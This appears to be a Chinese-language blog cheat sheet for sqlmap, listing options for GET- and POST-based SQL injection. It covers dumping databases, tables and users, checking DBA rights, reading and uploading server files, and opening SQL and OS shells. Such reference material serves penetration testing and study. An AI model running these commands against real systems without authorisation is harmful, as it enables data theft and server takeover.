<h2 id="get型"><a href="#get型" class="headerlink" title="get型"></a>get型</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-u：指定注入的URL   sqlmap -u URL<br><span class="hljs-attr">--dbs</span>：爆出所有数据库 sqlmap -u URL <span class="hljs-attr">--dbs</span><br><span class="hljs-attr">--dbms</span>：指定数据库类型 sqlmap -u URL <span class="hljs-attr">--dbms</span>=mysql<br><span class="hljs-attr">--users</span>：查看数据库的所有用户 sqlmap -u URL <span class="hljs-attr">--users</span><br><span class="hljs-attr">--current-user</span>：查看数据库当前用户 sqlmap -u URL <span class="hljs-attr">--current-user</span><br><span class="hljs-attr">--current-db</span>：查看网站当前数据库 sqlmap -u URL <span class="hljs-attr">--current-db</span><br><span class="hljs-attr">--is-dba</span>：判断当前用户是否有管理员权限 sqlmap -u URL <span class="hljs-attr">--is-dba</span><br>      <span class="hljs-selector-attr">[11:57:52]</span> <span class="hljs-selector-attr">[INFO]</span> testing <span class="hljs-keyword">if</span> current user is DBA<br>    <span class="hljs-selector-attr">[11:57:52]</span> <span class="hljs-selector-attr">[INFO]</span> fetching current user<br>    current user is DBA: True<br><span class="hljs-attr">--roles</span>：列出数据库所有管理员角色，仅适用于oracle数据库 sqlmap -u URL <span class="hljs-attr">--roles</span><br><span class="hljs-attr">--tables</span>：爆出所有数据表 sqlmap -u URL -D 数据库名 <span class="hljs-attr">--tables</span><br><span class="hljs-attr">--columns</span>：爆出数据库表所有列 sqlmap -u URL -D 数据库名 -T 表名 <span class="hljs-attr">--columns</span> <br><span class="hljs-attr">--dump</span>：爆出数据库中列中的所有数据 sqlmap -u URL -D 数据库名 -T 表名 -C 列名 <span class="hljs-attr">--dump</span><br><span class="hljs-attr">--dump-all</span>：爆出数据库中所有的数据 sqlmap -u URL -D 数据库名 -T 表名 <span class="hljs-attr">--dump-all</span><br><span class="hljs-attr">--sql-shell</span>：获取数据库shell  sqlmap -u URL <span class="hljs-attr">--sql-shell</span><br><span class="hljs-attr">--os-shell</span>：获取服务器shell  sqlmap -u URL <span class="hljs-attr">--os-shell</span><br><span class="hljs-attr">--file-read</span>：读取服务器文件  sqlmap -u URL <span class="hljs-attr">--file-read</span> <span class="hljs-string">&quot;文件路径及名称&quot;</span><br><span class="hljs-attr">--file-write</span> 本地文件 <span class="hljs-attr">--file-dist</span> 目标文件路径及名称：将本地文件上传至目标服务器<br><span class="hljs-attr">--time-sec</span>=<span class="hljs-number">2</span>：延时注入 sqlmap -u URL <span class="hljs-attr">--time-sec</span>=<span class="hljs-number">2</span><br><span class="hljs-attr">--batch</span>：探测过程中不进行询问，一律选择默认<br>-m：如果有多个url地址，可以把多个url保存成一个文本文件，-m可以加载文本文件逐个扫描<br></code></pre></td></tr></table></figure>



<h2 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">-r：指定POST数据文件  sqlmap -r post.txt<br><span class="hljs-params">--data</span>：这种不需要将数据进行保存，只需要将post数据复制下来即可 sqlmap -u URL <span class="hljs-params">--data=</span><span class="hljs-string">&quot;post数据&quot;</span><br><span class="hljs-params">--forms</span>：自动搜索表单的方式 sqlmap -u URL <span class="hljs-params">--forms</span><br><span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;抓取的cookie&quot;</span>：测试cookie字段<br><span class="hljs-params">--param-del</span>：参数拆分字符，当GET型或POST型需要用其他字符分割测试参数的时候需要用到此参数，sqlmap -r post.txt <span class="hljs-params">--data=</span><span class="hljs-string">&quot;query=foorbar;id=1&quot;</span> <span class="hljs-params">--param-del</span><br><span class="hljs-params">--referer</span>：在请求中伪造http中的referer，当level参数设定为3或者3以上的时候会尝试对referer注入<br><span class="hljs-params">--headers</span>：增加额外的http头<br><span class="hljs-params">--proxy</span>：指定代理地址<br>-p：指定测试参数<br></code></pre></td></tr></table></figure>

    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>
